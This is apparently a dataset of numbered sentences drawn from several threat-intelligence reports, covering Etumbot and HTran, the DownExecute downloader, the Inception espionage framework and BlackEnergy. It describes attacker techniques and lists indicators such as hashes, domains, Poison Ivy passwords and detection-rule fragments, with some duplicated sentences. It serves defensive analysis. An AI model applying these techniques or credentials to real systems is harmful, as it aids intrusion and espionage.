HTran would deliver the IP address of the final destination server if the final server were down or unreachable .", "866": "The code in use here has been modified to not reveal such information .", "867": "Organizations properly positioned with netflow or other traffic analysis capabilities may be able to locate upstream servers from HTran nodes that operate as the initial tier of C&C.", "868": "Htran activity can be detected with the following signature .", "869": "ET CURRENT_EVENTS HTran / SensLiceld . A response to infected host The import hash for the sample observed connecting to an Htran bouncer is a9059c354e5025dfe4f1c0b8b57e4f62 which links to other Etumbot samples compiled with Microsoft Visual C++ 5.0 in a similar March 2014 timeframe .", "870": "\u2022 4c703a8cfeded7f889872a86fb7c70cf 2014 - 03 - 24 \u2022 ff5a7a610746ab5492cc6ab284138852 2014 - 03 - 04 The following samples have been identified by ASERT as Etumbot malware .", "871": "The first identified sample has a compilation date of March 2011 , while the most recent was compiled in May 2014 .", "872": "Many droppers / installers contain Etumbot or , alternatively , IXESHE - related backdoors .", "873": "Most of the documents dropped with Etumbot are written in traditional Chinese .", "874": "Traditional Chinese ( versus simplified Chinese used in mainland China ) is most widely used in Taiwan .", "875": "While other areas do make use of traditional Chinese ( Hong Kong , Macau ) , the topics of the decoy documents strongly suggest that Taiwanese entities are the targets for many Etumbot samples .", "876": "A recent increase in Etumbot samples with configuration dates of 2014 seems to indicate that the Numbered Panda / IXESHE group has increased activity lately or has begun using Etumbot more widely in targeted campaigns .", "877": "ASERT engineers and researchers are part of an elite group of institutions that are referred to as \" super remediators , \" and represent the best in information security .", "878": "This is a reflection of having both visibility and remediation capabilities at a majority of service provider networks globally .", "879": "ASERT shares operationally viable intelligence with hundreds of international Computer Emergency Response Teams ( CERTs ) and with thousands of network operators via intelligence briefs and security content feeds .", "880": "ASERT also operates the world s largest distributed honeynet , actively monitoring Internet threats around the clock and around the globe via ATLAS , Arbor 's global network of sensors : http://atlas.arbor.net .", "881": "This mission and the associated resources that Arbor Networks brings to bear to the problem of global Internet security is an impetus for innovation and research .", "882": "To view the latest research , news , and trends from Arbor , ASERT and the information security community at large , visit our Threat Portal at http://www.arbornetworks.com / threats/.", "883": "pwc.blogs.com Updated Apr 27th , 2015 27 April 2015 By Tom Lancaster Follow @tlansec This short report details the techniques being used in a series of attacks mostly against Israel based organisations .", "884": "The decoy documents and filenames used in the attacks suggest the intended targets include organisations with political interests or influence in Israel and Palestine .", "885": "Although we are unable to link this campaign to any already documented in open source , it bears similarities to some described by others previously[1],[2 ] .", "886": "The earliest samples in the campaign we have identified date back to the summer of 2014 .", "887": "The number of samples discovered and relatively small scale of infrastructure suggest the attackers have limited resources with which to conduct attacks .", "888": "Our investigation begins by taking a look at the following file : ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9 .", "889": "According to the analysis published on malwr.com[3 ] , this file was originally named ' Israel Homeland Defense Directory 2015 _ Secured_.exe ' and , once executed , the following decoy document was presented .", "890": "The initial file in this case is a self extracting RAR file that contains three components , including a decoy document ( in this case , the PDF shown above ) and the malware .", "891": "Further inspection of the malware extracted showed it was n't a family our analysts recognised .", "892": "This , coupled with the nature of the decoy document used , led us to take a more in depth look at the malware , and associated infrastructure .", "893": "We 'd like to give special thanks to Eyal Sela of ClearSky Security for his collaborative efforts in this research .", "894": "The most common way this malware packaged is via a self extracting RAR file\u037e however the attackers also appear to have used a number of other solutions to drop their malware , including a Visual Basic based wrapper and an Auto IT based wrapper .", "895": "In terms of how the malware is delivered , it 's most likely that it 's done via spearphishing .", "896": "For example , there are also several occasions where the VirusTotal ' ITW ' tab suggests that the original dropper was available to download on a 3rd party website .", "897": "In the case of the sample discussed in the introduction we can see .", "898": "Pomf.se is a relatively low profile file sharing / hosting website currently based in Sweden .", "899": "The use of Pomf.se is a relatively low profile file sharing / hosting website currently based in Sweden .", "900": "The use of low key file sharing sites appears to be a feature of the campaign as far as we can tell , with a few other similar sites being used in the same way .", "901": "This , in conjunction with the nature of the related files we have discovered ( all of them are directly executable files ) means it is likely that the malware is primarily delivered via spear phishing attempts , rather than any other method .", "902": "In this analysis , we 'll go over the file with a SHA256 hash of ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9 .", "903": "We 've chosen to refer to the malware as ' DownExecute ' due to the .pdb string left in the malware ( leaving debug paths in malware seems to be very fashionable at the moment \u2026 ) .", "904": "All variants of the DownExecute ' malware we 've identified come packaged in the following fashion .", "905": "From the samples we have analysed so far , the decoy application included is never used by the binary , and is presumably included so that anyone taking a cursory look at the file will conclude it is in fact the real deal .", "906": "Whilst the cURL[4 ] binary included is used for internet connectivity but it 's currently unclear why the attackers chose to use this method of adding connectivity to their file .", "907": "Some of the binaries are also self signed .", "908": "So what can this malware do ? Not all that much \u2013 it 's just a downloader .", "909": "The malware then proceeds to decrypt some basic configuration data , including the command & control domain , and information about the origin of the infection , tracked via ID .", "910": "The DownExecute malware is used as a way for the attackers to gain an initial foothold on the victim machine .", "911": "We do n't have great visibility into post compromise activity at this stage\u037e however there are a number of other malware samples which communicate with the same infrastructure as the DownExecute samples .", "912": "It 's not unreasonable to infer that if these are more fully featured backdoors , that they are likely the 2nd stage malware families used in conjunction with DownExecute .", "913": "Specifically , we 've observed the well documented Xtreme RAT and Poison Ivy malware families in use with the same domain names as DownExecute .", "914": "The Poison Ivy passwords observed for the group were ' admin2014 ' and ' admin!@#$% \" .", "915": "The vast majority of infrastructure in terms of hostnames observed associated with these attacks have been dynamic DNS domains , primarily associated with no ip.com .", "916": "This provider is popular with several Middle Eastern threat actors tracked by PwC 's intelligence team .", "917": "In terms of the size of the infrastructure used in the campaign using the tools described , it 's also fairly small , as shown on our Maltego graph .", "918": "The attackers have made an unusual choice with respect to the hosting providers used for the malicious infrastructure .", "919": "Most of the domains at the time of writing , and indeed historically , have pointed to IP address space owned by Host Sailor , geo located in Belize .", "920": "Many of the threat actors in the Middle East that we 're familiar with have extremely volatile IP hosting , owing to the fact that the infrastructure is likely to be hosted on their own networks .", "921": "This remote hosting therefore somewhat bucks the trend of some of to be hosted on their own networks .", "922": "This remote hosting therefore somewhat bucks the trend of some of the other actors we see from the region .", "923": "As we have mentioned in a number of our other reports[5 ] , attackers often use C&C domains which contain phrases relevant to their targets so as to make them appear legitimate .", "924": "With this in mind we performed some simple analysis on the domain names used in this campaign to identify legitimate organisations being impersonated .", "925": "For a full list of C&Cs used , please see Appendix B.", "926": "As shown , there appears to be a theme here , with a number of Israeli news organisations being used as C&C themes and hence probably being targeted .", "927": "So do we believe this campaign is focused only at Israeli companies ? Perhaps not entirely .", "928": "Whilst there are a number of documents clearly aimed at Israeli nationals , using political and military themes , one of the lures[6 ] included an Arabic language decoy document pictured below .", "929": "The document in question discusses an alleged leak of information relating to Abbas , leader of the Palestine Liberation Organization .", "930": "Whilst this is a subject which is clearly of key interest to all parties in the region , the fact the attackers sent an Arabic language version of the story may indicate that the recipient was expected to be fluent in Arabic , and possibly therefore less likely to be Israeli , but rather someone from another adjacent region .", "931": "Whilst , in this case , we 're unable to attribute this set of activity to a specific group or entity in the Middle East , it does bear a significant resemblance to many attacks seen from the Middle East that have been previously documented .", "932": "Specifically , the following aspects of this campaign remind us of existing write ups on Middle Eastern campaigns .", "933": "The fact that the attackers chose to develop their own dropper may be indicative that their biggest problem when conducting network intrusions is getting their foot in the door \u2013 particularly as it seems as though they still prefer the more fully featured Poison Ivy and Xtreme RAT backdoors as 2nd stage malware families .", "934": "When we pivoted and looked for the earliest examples of the DownExecute malware , the first samples we could find were compiled in June 2014 .", "935": "We have no reason to believe in this case that the threat actor has tampered with the compile time on any samples , as all other samples discovered were identified shortly after they were compiled .", "936": "As such we believe the campaign using this downloader malware has been on going for approximately 12 months .", "937": "SHA256 rule DownExecute_A meta .", "938": "author = \" PwC Cyber Threat Operations : : @tlansec \" date = \" 2015 04 \" reference = \" http://pwc.blogs.com/cyber_security_updates/2015/04/attacks against israeli palestinia n interests.html \" description = \" Malware is often wrapped / protected , best to run on memory \" strings .", "939": "Terms of Service Privacy Policy", "940": "Blue Coat researchers have uncovered a previously-undocumented , highly automated , and extremely sophisticated framework for performing targeted attacks .", "941": "Initial malware components were embedded in Rich Text Format ( RTF ) files .", "942": "Malware payloads designed for a wide array of potential devices , including home routers and mobile devices running iOS , BlackBerryOS or Android , were also recovered during the course of our research .", "943": "The malware components of this framework follow a plugin model , where new malware rely on other , previously delivered malware components to interact with the framework .", "944": "Initial attacks were largely focused on Russia and a few other Eastern European countries .", "945": "However , we have later seen that attackers are interested in targets all over the globe .", "946": "The framework is itself target-agnostic , and seems highly automated .", "947": "The operational security exhibited by the attackers is very good - among the best we have seen .", "948": "Although the attackers have left a few clues , we have been unable to provide attribution with any degree of accuracy .", "949": "The use of software vulnerabilities in order to execute malicious software on unsuspecting users ' computers is an important parameter to monitor .", "950": "This method of attack is not only known to have a considerable success rate , it is also often deployed by resourceful attackers and , as such , marks a threat worth paying attention to .", "951": "The use of exploits in document formats like PDF , DOC and RTF is in some ways especially noteworthy .", "952": "Documents are commonly exchanged via mail , which make them perfect for email-borne targeted attacks ; what is otherwise known as spear phishing .", "953": "In March , 2014 , Microsoft published information about a new vulnerability in Rich Text Format ( RTF ) .", "954": "This vulnerability , named CVE-2014-1761 ( Microsoft Word RTF Object Confusion ) , had already been used effectively by attackers at the time of the announcement .", "955": "Two previous vulnerabilities in the RTF file format , known as CVE-2010-3333 and CVE-2012-0158 , had become , by that time , mainstays of targeted attacks , so we tracked how attackers implemented this new exploit with keen interest .", "956": "By late August , we identified a malware espionage operation that used both the CVE-2014-1761 and CVE-2012-0158 vulnerabilities to trigger execution of the malicious payload , and which leveraged a single cloud service as the backbone of its entire visible infrastructure .", "957": "When we examined the suspicious documents , it was discovered that they were somewhat anomalous compared to the run-of-the-mill material .", "958": "Due to the many levels of obfuscation and indirection , we named this the Inception framework ; but there ends all similarity with the movie by the same name .", "959": "Leonardo DiCaprio is not associated with this investigation .", "960": "We initially knew little about who the actual targets were ; apart from one .", "961": "The email was apparently sent from '' Mrs. World '' ; note the Mrs. , and not Miss - World .", "962": "We soon discovered that our malware repository contained several other , similar documents , but these had come from other sources which did not include the email message , or any identifiable information about the targets .", "963": "However , the text of the documents covered a variety of topics mostly revolving around Russian issues relating to a variety of business sectors .", "964": "The following pages highlight a representative selection of these documents .", "965": "All documents that we have found so far have been rather standard Word documents , of the old 97-2003 compatible format based on OLE2 .", "966": "Such documents can , and typically do , contain quite a bit of metadata : The name of the document creator ; the user who edited it most recently ; the name of the company whose copy of Word was used to create the document , et al .", "967": "Users can optionally configure Word to remove this metadata when a document is saved , and that 's exactly what the creator of these documents did , stripping out this potential source of attribution data .", "968": "However , Word documents in this format contain additional information , if you know where to look .", "969": "All Word documents of this format contain what 's known as a File Information Block ( FIB ) .", "970": "The FIB contains information about the file 's internal structure , and also \u2013 to some extent \u2013 data on the program used to create the file .", "971": "In the case of the samples we analyzed , all of the documents were saved using the same build of Microsoft Word from Office14 ( better known as Office 2010 ) .", "972": "In addition , documents can contain slack space in which old data remains .", "973": "For example , the decoy that came with the attack named '' Organigrama Gobierno Rusia.doc '' contains Visual Basic leftovers indicating that it originally was created on a computer that was configured to be used by a native Spanish speaker , apparently by an advisor at the Spanish Embassy in Moscow .", "974": "Despite the limited information at our disposal about the targets of these attacks , their content reveals some context about who the possible targets may have been .", "975": "The VBScript dropper code is also a little unusual .", "976": "It declares a Windows Management Instrumentation ( WMI ) object in order to reach components like the registry and file system .", "977": "This seems adapted from Microsoft example code , like the one found at http : //msdn.microsoft.com/en-us/library/aa387236 ( v=vs.85 ) .aspx", "978": "One is a polymorphed dll file and the other a binary data file with no obvious internal structure .", "979": "The names of these dropped files change from attack to attack .", "980": "Other names observed were : The encrypted data files are named using random words apparently taken from a dictionary \u2013 '' acholias '' , '' arzner '' , '' bicorporate '' , '' crockrell '' , '' damnatorily '' etc .", "981": "Looking at one of the dropped dlls we can see the authors originally called it 95Num3P3gm.dll.polymorphed.dll .", "982": "It is hard to describe the polymorphed dlls with any real depth , as there is little consistency between them .", "983": "When two nearly identical dlls are encoded using the polymorphic scheme there is very little code in common .", "984": "The call graphs are different and key functions have varying number of arguments .", "985": "The sizes of buffers allocated are also randomized to mask their intent .", "986": "What is common is that somewhere along the execution cycle is one extremely large function ( over 200 kb in length ) where early in a large allocation is made where the un-obfuscated binary will be placed .", "987": "The binary is then built from de- obfuscating segments of it that have been dispersed through the '.rdata ' section .", "988": "Simply halting execution before this function call permits a researcher to extract the reconstructed DLL from memory .", "989": "Here , pausing execution before the call to 'loadpefrommemory ' reveals the extracted PE at the memory address pointed to by edx .", "990": "This reconstructed DLL , once loaded , will decode a configuration structure from its '.data ' section which contains three important details : the name of the encrypted data file dropped by the VBScript ; the AES key used to decrypt the file ; and the name of a unique global mutex to hold while running to prevent multiple instances .", "991": "This turns out to be yet another dll .", "992": "The first ordinal exported by this dll is located and then called , passing in the configuration and the name of the encrypted file on disk as parameters .", "993": "This last dll is the heart of the threat ( originally called q5Byo.dll in this instance .", "994": "This file contains the true intent of this campaign .", "995": "WebDAV is a communication standard that allows file management over HTTP or HTTPS .", "996": "Windows allows WebDAV sessions to be mapped as network resources .", "997": "The use of WebDAV as the communication channel is atypical for most malware samples we see .", "998": "By using a network resource , the actual web traffic originates from the system itself , and not from the process in which the malware resides .", "999": "All the authentication information for the WebDAV session including the URL , folders , path , user name , and password is stored within this last DLL in another AES-encrypted configuration structure in the binary .", "1000": "A unique path , username , and password were used for each malware instance we 've seen in the wild .", "1001": "Also contained within the configuration structure is information on how to name the survey data on the remote file server .", "1002": "The binary reads from its configuration a string on how to generate the remote filename , and a list of extensions to use .", "1003": "An example would be '' 1-7d0-8s '' , [ '' TIF '' , '' TAR '' , '' SIT '' ] which instructs the binary to generate a filename with 1 to 7 numeric digit characters followed by 0 to 8 ASCII letters with one of the three listed extensions such as '' 664gher.TAR '' .", "1004": "The cloud storage provider in every case we have seen was the Swedish company CloudMe.com , which offers free and paid WebDAV cloud storage .", "1005": "The URI model used by the malware is http : //webdav.cloudme.com/ % username % /CloudDrive/ which is a direct reference to file storage .", "1006": "It must be noted that the CloudMe service is not actively spreading the malicious content ; the attackers are only using it for storing their files .", "1007": "We notified CloudMe.com about the abuse of their services .", "1008": "Their CEO , Mr. Daniel Arthursson , was none too happy about this , and was very helpful in our further research .", "1009": "CloudMe has shared a great deal of log information related to this attack .", "1010": "These indicate that there are many other accounts ( over 100 ) likely related to this attack system .", "1011": "We have no way of verifying this with absolute certainty , but this is what we regard as a high confidence assumption .", "1012": "The cloud accounts are not used for one-way communication only .", "1013": "One such case is the franko7046 account , used against the previously mentioned bank CEO .", "1014": "This is how we found the depp3353 account .", "1015": "In this new account there was another surprise waiting for us \u2013 a download folder with two new encrypted files , 921.bin and 922.bin .", "1016": "Once decrypted , these turned out to be PE executables .", "1017": "The two new executables are plugins - quite similar to each other and obviously compiled on the same setup .", "1018": "Of interest , both of the DLLs originally had the same internal name ( 78wO13YrJ0cB.dll ) .", "1019": "Presumably the same PE sanitization script and parameters were used on both .", "1020": "None of these plugins contain any means of CnC communication .", "1021": "Neither are they ever written to disk .", "1022": "This makes these modules extremely stealthy , flexible and compatible with multiple toolsets independent of what CnC method is being used .", "1023": "This model makes it possible to do the intrusion in steps , with verification stages in between ; and the files will not be easily found on affected computers .", "1024": "Based on the information gathered from these modules , the attackers appear to move to the next stage of their attack by placing more new components on the WebDAV shares .", "1025": "Information about these uploads is limited by the fact that we do not have the AES keys to decrypt much of the uploaded data , but we have been able to see some upload patterns .", "1026": "What we assume to be third-stage plugins appear on the shares as *.bin files of roughly 72kb .", "1027": "However , the next day , another *.bin file of the same size will be uploaded to the share .", "1028": "This is a pattern that repeats itself over all live accounts .", "1029": "For Windows XP this will typically be '' Microsoft-WebDAV-MiniRedir/5.1.2600 '' , and for Windows 7 a common user-agent is '' Microsoft-WebDAV-MiniRedir/6.1.7601 '' .", "1030": "Security researchers \u2013 and there are a few of them - connect in a variety of ways ; first of all , we see a number of connections that are indistinguishable from the way victims connect .", "1031": "This happens when researchers use lab machines with live internet access to run the malware .", "1032": "The only way we can tell these are researchers is because they connect from IP address ranges that are unlikely to be victims ; and they also tend to consist of short-lived sessions .", "1033": "Some researchers set up scheduled tasks to scan the shares for new updates and malware .", "1034": "We see a few variations of these \u2013 one typical configuration is where the requests contain a Python-related user-agent string .", "1035": "Attackers , on the other hand , do n't appear to use Windows .", "1036": "We know these are not researchers , because we can see malware files being uploaded by them : We have a log fragment in which the attackers uploaded a sequential series of updates ( from 1746.bin to 1774.bin ) within 1.5 hours on Sept 17th , spread over 27 different accounts and using 27 different IP addresses in the process .", "1037": "The user-agent string shows that attackers likely have used a client based on the open source davfs2 file system for Linux to mount the WebDAV shares .", "1038": "This client is used when uploading new malware , but also when the attackers scan their shares for new victim updates , in which case the shares are enumerated by requests in a scheduled manner .", "1039": "The attackers have used a large number of IP addresses to access the shares .", "1040": "As mentioned above , there is a rotation scheme in place in which a new IP address will be used after a few minutes of access against CloudMe accounts .", "1041": "These IP 's are distributed widely over geographical locations and service providers , with a heavy bias towards South Korean ranges .", "1042": "At first we thought these IP 's belonged to some commercial proxy service , particularly since several such proxy services also offer IP rotation .", "1043": "However , this turned out to be a wrong assumption .", "1044": "A superficial examination of the proxy IP addresses that connected to CloudMe showed them to be internet-connected devices of various kinds .", "1045": "Many were Korean Tera-EP home routers ; but there were several other products represented .", "1046": "We were able to do some forensic work on a compromised Tera-EP TE-800 device and discovered another dimension of the attacker 's infrastructure .", "1047": "Under the ramfs mounted partition we found a stripped and statically linked MIPS-el binary named tail- .", "1048": "Instances of this were also found under the running process list .", "1049": "Each sample of the binary we were able to acquire was configured with a unique 32byte blowfish key and a small , encrypted section appended to the end of the binary .", "1050": "This acts as a management interface .", "1051": "From here the attackers can request a specific port to be opened as one of the following types : SOCKET , SOCKSS , SOCKAT , SOCKS5 , or STATUSPORT .", "1052": "To prevent anyone else from accessing this service all communication on the management interface is encrypted using the same blowfish key .", "1053": "This setup makes it difficult to identify embedded devices compromised with this malware by scanning open ports .", "1054": "In the wild we witnessed the attackers connect to the management port and request SOCKSS connections .", "1055": "This would open the specified port and wait for configuration data , which consists of a domain name ( webdav.cloudme.com ) , the destination port , and a variable length RC4 key , all of which encrypted using the blowfish key .", "1056": "The graphic below illustrates a typical session .", "1057": "The router proxy network provides another layer of indirection masking the attackers ' infrastructure .", "1058": "However , because we captured traffic through one of these embedded devices we could identify other parts of their operation .", "1059": "This IP would make connections hourly and poll the status of the router proxy malware .", "1060": "This machine is most likely used to track which compromised routers are currently available for use .", "1061": "However , later we observed that the Email sender IP at VOLIA vanished and the Unlocker server taking over its role as well .", "1062": "Each of these connections used the correct encryption key , so we know that these accesses came from the attackers and not some opportunistic third party .", "1063": "We were later notified by Symantec ( thanks , guys ! ) about a third .", "1064": "These servers were hosted on domains that were registered by the attackers , using domain names clearly meant to look legitimate .", "1065": "This is the only time we have seen attackers register domains in this investigation .", "1066": "The mail proxies were : Registrant WHOIS information seems forged : The connections made from the Ukrainian host to the router were interesting .", "1067": "From captured traffic it appears that the mail proxies have SOCKSv5 services running on obscure high ports .", "1068": "We have documented that the attackers log in to these using apparently randomly generated usernames and passwords , a unique pair for each server .", "1069": "Investigating the target email addresses , we saw several of these were found in this public document from the World Petroleum Council , including some addresses that are , at the present time , no longer valid .", "1070": "And then , the ground shifted again .", "1071": "There was no executable attachment in this mail , but instead a link shortened by the URL shortener service bit.ly , with the underlying link pointing to an IP address on a Dutch hosting service .", "1072": "Clicking that link from a Windows PC only yielded a redirection to the BBC homepages , and using other devices did not give more data .", "1073": "The bit.ly service does however provide information on the user creating the shortened link , and other links associated with this account .", "1074": "In this case , the user was named nicolatesla53 .", "1075": "The nicolatesla53 account was created in July 2014 .", "1076": "From Oct 24th to Nov 21st this user created nearly 10000 shortened links \u2013 we harvested 9990 unique ones .", "1077": "Three IP addresses were used for these links : The links themselves were on this format : As far as we were able to tell , there were three main types of actioncode : We have no sample of the actual MMS phishing messages apparently being sent , but we can see the page served when a user clicks a spammed link .", "1078": "This is just a dialogue box asking for the password presumably included in the initial message , and the next stage likely involves download of malicious content .", "1079": "We were in the middle of harvesting the servers for data on the various action codes when they all were abruptly taken offline ; so our data on which mobile operators are targeted is not complete .", "1080": "We managed to get 66 of a total of 190 .", "1081": "The ones we know of are shown below .", "1082": "A full breakdown of mobile operators and related links is included in the appendix .", "1083": "The composition of links created for the various mobile operators is quite interesting , as one can speculate that they represent amount of actual or planned attacks in different countries .", "1084": "With the top three operators being Vodafone , T- Mobile and Proximus ( Belgacom ) it seems these apparent phishing attacks are less focused on the Russian sphere than the previously discussed malware .", "1085": "This map is not complete , though .", "1086": "It represents only about 35 % ( 66/190 ) of all mobile operators targeted and 66 % ( 3152/4781 ) of all phishing links we managed to harvest .", "1087": "In addition , some operators like Vodafone are global actors , so the map might show an unfair intensity in their HQ locations .", "1088": "The rest of the bit.ly links used the action codes 743 or 1024 .", "1089": "And now things really get interesting .", "1090": "By using mobile device HTTP User-Agents we were able to trigger downloads of malware components from some of these links .", "1091": "The package we analyzed was 1.2MB in size .", "1092": "It uses a custom DAO/Database scheme which uses accounts belonging to the virtual community Live Journal ( livejournal.com ) as data stores .", "1093": "Three such accounts were found hardcoded in the package : The accounts all state that they belong to Iranian users .", "1094": "This is very likely false .", "1095": "The text in these posts starts first out in cleartext , but quickly turns into unreadable gibberish .", "1096": "Based on registration data and folder configuration we believe these are legitimate but compromised Joomla servers .", "1097": "And then an unexpected oddity shows up in the Java source : We were also able to download a similar malware sample ( BrowserUpdate.apk ) from one of the C & C servers .", "1098": "This sample used different online accounts for its DAO/database functionality , but is otherwise quite similar to the first .", "1099": "In this particular case , the FTP account is located on a legitimate ( if struggling ) hosting service in the UK .", "1100": "In this case , there 's another clue : The WhatsAppUpdate project seems derived from an earlier template named SkypeUpdate .", "1101": "By now , it came as no surprise when we triggered a download with a BlackBerry User-Agent .", "1102": "The initial download was a Java Applications Descriptor , a text file designed for Over-The-Air installation of Java-based applications .", "1103": "This JAD file contained the locations of the two Blackberry *.COD binaries which we then could download directly .", "1104": "Since these COD files are also compiled Java code , they are possible to decompile to original source code .", "1105": "In a similar fashion to the Android version , we find interesting strings there .", "1106": "This time they are in Arabic : The earliest sample of Inception-related malware we have been able to obtain , was submitted to us in June 2014 .", "1107": "However , decoy document metadata shows that it was created late May .", "1108": "The related cloud account was created just before that .", "1109": "An examination of the other documents associated with the attacks show that they have been created at a steady pace all through summer and autumn 2014 and attacks are still ongoing .", "1110": "Of interest is also the attackers ' activity patterns over the 24h cycle .", "1111": "The main upload of new components to shares seems to be divided over two high\u2013activity periods : 6:00 -10:00 UTC and 17:00 - 21:00 UTC .", "1112": "No uploads were seen between 23:00 and 05:00 UTC .", "1113": "It is however doubtful how indicative these timeframes are .", "1114": "To illustrate , we looked into another and more obscure timing factor : The timing of the AES InitVector random seeds .", "1115": "A random seed is the initial value passed into a pseudo-randomizer function .", "1116": "The malware uses the random output to create what is known as an InitVector - a starting point for the AES encryption/decryption function .", "1117": "The code used in some of the DLLs indicate that the attackers tend to use the C time ( ) function to generate random seeds .", "1118": "This function returns values of granularity down to seconds .", "1119": "Thus random seeds , and ultimately the InitVectors , are functions of these quite coarse units of time .", "1120": "Since we know the time window to be within a few days of the upload time we were able to brute force the time values that would generate the corresponding InitVectors .", "1121": "Thus , we were able to say to the second when the file was created \u2013 and most times were identified to be in the range 1500 - 2200 GMT .", "1122": "Unfortunately , we had to reject these data .", "1123": "Either the attackers ' system clock is wrong or a fixed offset is added to the random seed .", "1124": "Either way , the data ca n't be trusted ; and shows that nothing can be taken at face value .", "1125": "This executable , ( sccm.exe , md5 dd8790455109497d49c2fa2442cf16f7 ) is a classical Chinese APT implant .", "1126": "This development was unexpected for several reasons .", "1127": "First of all , it apparently breaks the strict , obfuscatory operational security built into the Inception framework .", "1128": "Another factor which is out of character is the coding style .", "1129": "All Inception-related malware is written using Visual Studio 2010 .", "1130": "The downloaded sccm.exe is written using Visual C++ 6 ; and has a PE header compile date of October 2010 .", "1131": "This date can be forged , and indeed , all Inception-related malware has some level of forgery in the compile dates .", "1132": "However , the sccm.exe compile date matches the Quarian developer toolset and coding style to a better degree than the other files distributed through Inception .", "1133": "According to DomainTools.com the msname.org domain registration timed out September 27th 2014 .", "1134": "It was left inactive and was not renewed until Nov 12th .", "1135": "This means that the attackers distributed malware that would be out of action for a long time ( last distribution of sccm.exe was September 26th ) .", "1136": "Because of all this we consider sccm.exe as an unreliable indicator .", "1137": "It is likely to be a red herring purposefully placed on shares where the attackers have seen signs of access by security researchers .", "1138": "At one instance the attackers seem to have slipped up .", "1139": "Instead of using their scheduled task , they apparently did something manually on a WebDAV share .", "1140": "This is visible because the request came from an apparent attacker IP , but used yet another User-Agent : '' gvfs/1.12.3 '' .", "1141": "Gvfs is the virtual filesystem for Gnome desktop .", "1142": "The action on the account was abnormal as well ; an apparent file upload : When WebDAV shares are mapped up as drives by the operating system , any action taken by the attacker follows the same pattern as on the attacker 's local drive .", "1143": "In the case above , it seems the attacker attempted to edit a new document , which by default is given the name '' Untitled document '' in Gnome .", "1144": "This might indicate that the attacker 's operating system language is Spanish .", "1145": "Of course , Spanish is one of the world 's most widespread languages , so one can not infer much from this .", "1146": "There is even a small possibility that the phenomenon is a pure artifact ; for example that a Spanish-speaking researcher connected to the same account using the same Linux-based setup as the attackers .", "1147": "This attack system shares a number of properties that are somewhat similar with the Red October campaigns detailed by Kaspersky Labs in 2013 .", "1148": "For more information about this see : The '' Red October '' Campaign - An Advanced Cyber Espionage Network Targeting Diplomatic and Government Agencies However , there are also clear differences .", "1149": "The code is fully rewritten ; there appears to be little code overlap , at least in the initial stage malware .", "1150": "The coding style is different , with different solutions to programmatic problems , different use of exception handling , and different use of C++ classes .", "1151": "It 's hard to believe that the same programmers are responsible for the two code bases .", "1152": "The Red October malware contained linguistic markers that pointed towards Russian speaking attackers .", "1153": "No such clues have been found in the Inception- related malware ; there is a marked difference in the attention to detail and information leakage .", "1154": "It is certainly possible that the same people have organized both Inception and Red October , but there are no clear indications to this effect .", "1155": "The Windows-based malware in this paper generally contains very few noticeable strings apart from what is commonly found in software , and clearly randomized strings .", "1156": "What exists \u2013 like the word '' polymorphed '' in the early DLL versions - is standard English with few discerning features .", "1157": "This changes a bit when we look at the mobile malware .", "1158": "In the Android malware we find Hindi comments in the Java source code .", "1159": "In the Iphone malware we find project paths referencing one '' JohnClerk '' , and a few typos like '' conutry '' .", "1160": "In one of the Blackberry binaries we find the string '' GodSaveTheQueen '' , a rather blunt hint towards Britain , as well as Arabic log strings .", "1161": "These and other indicators have led us to conclude that the Inception attackers are setting a new standard for deliberate disinformation and red herrings in a malware espionage operation .", "1162": "Some clues might have been added by accident , but none of these indicators can be trusted in any way .", "1163": "Thus we are not going to assume anything about who might be behind these attacks .", "1164": "The whole Inception setup shows signs of automation and seasoned programming .", "1165": "The amount of layers used in this scheme to protect the payload of their attack seems excessively paranoid .", "1166": "The names of the files both when dropped and their original names along with the callback directories , paths and mutexes used all seem to be dynamically generated .", "1167": "This suggests that this a large campaign and we 've only seeing the beginning of it .", "1168": "Initially many of the targets were located in Russia or related to Russian interests , but as the campaign has evolved we have verified targets in countries all over the world .", "1169": "It is clear that this infrastructure model does not need to be applied solely against a few targets , or even need to be hosted at CloudMe .", "1170": "The framework is generic , and will work as an attack platform for a multitude of purposes with very little modification .", "1171": "The attribution indicators point in different directions and ca n't be given much weight .", "1172": "These attacks can in theory be the creation of nation states or resourceful private entities - we consider it very unlikely that they are performed by one or just a few individuals .", "1173": "haarmannsi.cz sanygroup.co.uk ecolines.es blackberry-support.herokuapp.com ( DynDNS ) The following entities have helped in big and small ways .", "1174": "Big thanks to all .", "1175": "We also owe a big debt of gratitude to Ryan W. Smith of Blue Coat who helped us tremendously with the analysis of the mobile malware .", "1176": "The BlackEnergy malware is crimeware turned APT tool and is used in significant geopolitical operations lightly documented over the past year .", "1177": "An even more interesting part of the BlackEnergy story is the relatively unknown custom plugin capabilities to attack ARM and MIPS platforms , scripts for Cisco network devices , destructive plugins , a certificate stealer and more .", "1178": "Here , we present available data - it is difficult to collect on this APT .", "1179": "We will also present more details on targets previously unavailable and present related victim profile data .", "1180": "These attackers are careful to hide and defend their long - term presence within compromised environments .", "1181": "The malware 's previously undescribed breadth means attackers present new technical challenges in unusual environments , including SCADA networks .", "1182": "Challenges , like mitigating the attackers ' lateral movement across compromised network routers , may take an organization 's defenders far beyond their standard routine and out of their comfort zone .", "1183": "BlackEnergy2 and BlackEnergy3 are known tools .", "1184": "There are no indications of how many groups possess this tool .", "1185": "Over time , BlackEnergy2 was assumed into the toolset of the BE2/Sandworm actor .", "1186": "To be clear , our name for this actor has been the BE2 APT , while it has been called \" Sandworm Team \" also .", "1187": "Before evidence of BlackEnergy2 use in targeted attacks was uncovered , we tracked strange activity on one of the BlackEnergy CnC servers in 2013 .", "1188": "This strangeness was related to values listed in newer BlackEnergy configuration files .", "1189": "The config file provides download instructions for the loader .", "1190": "It also instructs the loader to pass certain commands to the plugins .", "1191": "In this particular case in 2013 , the config file included an unknown plugin set , aside from the usual ' ddos ' plugin listing .", "1192": "Displayed below are these new , xml formatted plugin names \" weap_hwi \" , \" ps \" , and \" vsnet \" in a BlackEnergy configuration file download from a c2 server .", "1193": "This new module push must have been among the first for this group , because all of the module versions were listed as \" version 1 \" , including the ddos plugin .", "1194": "The ' ps ' plugin turned out to be password stealer .", "1195": "Most surprising was the ' weap_hwi ' plugin .", "1196": "It was a ddos tool compiled to run on ARM systems .", "1197": "At first , we did n't know whether the ARM plugin was listed intentionally or by mistake , so we proceeded to collect the CnC 's config files .", "1198": "After pulling multiple config files , we confirmed that this ARM object inclusion was not a one - off mistake .", "1199": 